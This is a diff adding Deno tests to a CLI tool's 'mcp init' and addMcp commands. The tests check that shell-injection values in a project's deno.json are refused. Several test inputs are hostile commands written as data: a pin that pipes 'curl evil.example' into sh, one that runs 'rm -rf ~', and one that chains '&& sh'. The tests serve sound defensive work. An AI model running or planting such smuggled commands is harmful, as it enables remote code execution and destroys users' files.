@@ -25,6 +25,7 @@ import { scaffoldFiles, scaffoldProject } from "../src/build/scaffold.ts";
 import { FEATURES, preselectedFeatures } from "../src/cli/commands/create.ts";
 import { mcpCommand } from "../src/cli/commands/mcp.ts";
 import { capture, makeCtx, stubExit } from "./_cli-coverage-helpers.ts";
+import { VERSION } from "../mod.ts";
 
 const CLI = "jsr:@denext/denext@^3.0.0/cli";
 // deno-lint-ignore no-explicit-any
@@ -270,6 +271,70 @@ Deno.test("denext mcp init: prints the plan, pins the project's denext, rejects 
     assertStringIncludes(errs, "unknown --disable token(s): nope");
     assertStringIncludes(errs, 'unknown action "setup"');
     assertEquals(exit.calls, [1, 1, 1]);
+  } finally {
+    await Deno.remove(dir, { recursive: true });
+  }
+});
+
+Deno.test("denext mcp init: a malicious denext pin never reaches the task command", async () => {
+  const evil = "jsr:@denext/denext@^3.0.0;curl evil.example|sh;#";
+  const dir = await project(
+    `{\n  "imports": { "denext": ${JSON.stringify(evil)} },\n  "tasks": {}\n}\n`,
+  );
+  const cap = capture();
+  const warn = console.warn;
+  const warnings: string[] = [];
+  console.warn = (...a: unknown[]) => void warnings.push(a.join(" "));
+  try {
+    await mcpCommand.run(makeCtx({ positionals: ["init", dir], flags: { clients: "claude" } }));
+  } finally {
+    console.warn = warn;
+    cap.restore();
+  }
+  try {
+    const task = (await readJsonFile(dir, "deno.json")).tasks.mcp as string;
+    assert(!/[;|&$`'"\s]curl|evil/.test(task), task);
+    assertEquals(task, `deno run -A jsr:@denext/denext@^${VERSION}/cli mcp`, "this CLI's own");
+    assert(warnings.some((w) => w.includes("not a plain semver range")), warnings.join("\n"));
+  } finally {
+    await Deno.remove(dir, { recursive: true });
+  }
+  // A real range the task shell would misread (`>` redirects) falls back to this CLI too.
+  const ranged = await project(
+    '{\n  "imports": { "denext": "jsr:@denext/denext@>=3.0.0" },\n  "tasks": {}\n}\n',
+  );
+  const cap2 = capture();
+  try {
+    await mcpCommand.run(makeCtx({ positionals: ["init", ranged], flags: { clients: "claude" } }));
+  } finally {
+    cap2.restore();
+  }
+  try {
+    assertEquals(
+      (await readJsonFile(ranged, "deno.json")).tasks.mcp,
+      `deno run -A jsr:@denext/denext@^${VERSION}/cli mcp`,
+    );
+    assertStringIncludes(cap2.errs.join("\n"), "can't run from a task");
+  } finally {
+    await Deno.remove(ranged, { recursive: true });
+  }
+});
+
+Deno.test("addMcp refuses a CLI specifier that is not denext's", async () => {
+  const dir = await project();
+  try {
+    for (
+      const cli of [
+        "jsr:@denext/denext@^3.0.0/cli; rm -rf ~",
+        "jsr:@denext/denext@>=3.0.0/cli",
+        "npm:evil/cli",
+        "jsr:@denext/denext@^3.0.0/cli mcp && sh",
+      ]
+    ) {
+      await assertRejects(() => addMcp(dir, cli), Error, "refusing the MCP task's CLI");
+    }
+    assertEquals((await readJsonFile(dir, "deno.json")).tasks.mcp, undefined, "nothing written");
+    assertEquals((await addMcp(dir, "jsr:@denext/denext/cli")).errors, []);
   } finally {
     await Deno.remove(dir, { recursive: true });
   }
